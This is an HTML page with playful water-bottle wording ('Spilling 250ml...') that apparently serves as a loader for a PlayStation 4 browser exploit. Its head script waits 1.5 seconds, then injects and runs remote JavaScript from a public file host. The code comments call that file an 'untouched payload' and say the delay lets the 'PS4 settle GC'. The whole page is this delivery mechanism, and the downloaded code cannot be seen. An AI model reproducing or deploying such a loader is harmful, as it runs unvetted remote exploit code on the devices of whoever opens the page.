<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  setTimeout(() => {
    const script = document.createElement('script');
    script.src = 'https://files.catbox.moe/cwedrd.js'; // untouched payload
    script.defer = true; // helps browser postpone execution

    script.onload = () => {
      document.getElementById("status").textContent = "Spilling water unless system frozen...";
    };

    script.onerror = () => {
      document.getElementById("status").textContent = "Bottle not filled.";
    };

    document.head.appendChild(script);
  }, 1500); // Delay to let PS4 settle GC and flush buffers
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
